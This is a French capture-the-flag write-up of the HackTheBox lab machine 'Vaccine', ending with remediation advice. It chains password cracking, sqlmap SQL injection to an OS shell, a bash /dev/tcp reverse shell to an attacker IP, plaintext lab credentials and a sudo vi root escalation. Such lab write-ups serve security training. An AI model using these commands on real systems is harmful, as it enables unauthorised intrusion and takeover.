# HackTheBox — Vaccine (Starting Point)

## Informations

| Champ | Valeur |
|---|---|
| **Machine** | Vaccine |
| **OS** | Linux (Ubuntu 20.04) |
| **Difficulté** | Very Easy |
| **IP cible** | 10.129.95.174 |

---

## Résumé de la chaîne d'exploitation

```
FTP anonyme → backup.zip → hash MD5 cracké → Login admin
     ↓
SQLi sur dashboard.php → os-shell → Reverse shell
     ↓
Credentials PostgreSQL en clair → SSH
     ↓
sudo vi → Privilege Escalation → ROOT
```

---

## Étape 1 — Reconnaissance (Nmap)

```bash
nmap -sC -sV 10.129.95.174
```

**Ports ouverts :**
- `21/tcp` — FTP (vsftpd 3.0.3)
- `22/tcp` — SSH (OpenSSH 8.0p1)
- `80/tcp` — HTTP (Apache 2.4.41)

---

## Étape 2 — FTP anonyme

```bash
ftp 10.129.95.174
# user: anonymous / ENTER
get backup.zip
```

Extraction du zip (protégé par mot de passe) :

```bash
zip2john backup.zip > ziphash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
# password zip : 741852963
unzip -P 741852963 backup.zip
```

---

## Étape 3 — Crack du hash MD5

Dans `index.php`, on trouve :

```php
md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"
```

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# résultat : qwerty789
```

**Credentials admin :**
```
username : admin
password : qwerty789
```

---

## Étape 4 — Injection SQL (sqlmap)

Le paramètre `search` de `dashboard.php` est vulnérable à une SQLi.

```bash
sqlmap -u "http://10.129.95.174/dashboard.php?search=root" \
  --cookie="PHPSESSID=<session_id>" \
  --os-shell \
  --batch
```

**DBMS détecté :** PostgreSQL  
**Technique :** `COPY ... FROM PROGRAM` (user est DBA)

---

## Étape 5 — Reverse Shell

**Terminal 1 — listener :**
```bash
nc -lvnp 4444
```

**Terminal 2 — os-shell sqlmap :**
```bash
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.90/4444 0>&1'
```

Shell obtenu en tant que `postgres`.

---

## Étape 6 — Credentials en clair

```bash
cat /var/www/html/dashboard.php
```

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

**Credentials PostgreSQL :**
```
user     : postgres
password : P@s5w0rd!
```

---

## Étape 7 — SSH

```bash
ssh postgres@10.129.95.174
# password : P@s5w0rd!
```

**Flag user :**
```bash
cat ~/user.txt
# ec9b13ca4d6229cd5cc1e09980965bf7
```

---

## Étape 8 — Privilege Escalation (sudo + vi)

```bash
sudo -l
# (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Vi peut spawner un shell via la commande `:!` :

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Dans vi :
```
:!/bin/bash
```

Shell root obtenu !

```bash
cat /root/root.txt
```

---

## Vulnérabilités identifiées

| Vulnérabilité | Impact |
|---|---|
| FTP avec credentials faibles | Accès aux fichiers sensibles |
| Hash MD5 sans sel | Crack trivial via dictionnaire |
| Injection SQL non filtrée | Exécution de commandes OS |
| Mot de passe en clair dans le code | Accès SSH direct |
| sudo vi sans restriction | Escalade vers root |

---

## Leçons / Remédiation

- Utiliser **bcrypt/argon2** pour les mots de passe (jamais MD5 seul)
- Utiliser des **requêtes préparées** (prepared statements) contre les SQLi
- Ne jamais stocker des **credentials en clair** dans le code source
- Restreindre les droits **sudo** — ne jamais autoriser des éditeurs de texte
- Désactiver le **FTP anonyme** ou restreindre les accès
